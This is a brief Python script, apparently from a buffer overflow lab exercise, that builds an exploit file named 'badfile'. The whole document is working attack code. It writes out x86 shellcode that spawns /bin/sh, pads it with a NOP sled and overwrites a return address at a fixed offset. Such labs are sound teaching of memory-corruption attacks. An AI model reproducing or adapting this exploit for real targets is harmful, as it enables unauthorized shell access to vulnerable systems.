# machine code which launches shell or terminal for user
shellcode = (
	"\x31\xc0"   # xorl  %eax, %eax
	"\x50"       # pushl %eax
	"\x68""//sh" # pushl $0x68732f2f
	"\x68""/bin" # pushl $0x6e69622f
	"\x89\xe3"   # movl  %esp, %ebx
	"\x50"       # pushl %eax
	"\x53"       # pushl %ebx
	"\x89\xe1"   # movl  %esp, %ecx
	"\x99"       # cdq
	"\xb0\x0b"   # movb  $0x0b, %al
	"\xcd\x80"   # int   $0x80
).encode('latin-1')

# populating 'content' of exploit with NOPs (no operation)
content = bytearray(0x90 for i in range(300))

# putting 'shellcode' at the end of 'content'
start = len(content) - len(shellcode)
content[start: ] = shellcode

# putting "probable" return address (ret_addr = $ebp + offset)
return_address = 0xbfffec18 + 180
content[36: 40] = return_address.to_bytes(4, byteorder='little')

# writing exploit to 'badfile'
with open('badfile', 'wb') as badfile:
    badfile.write(content)
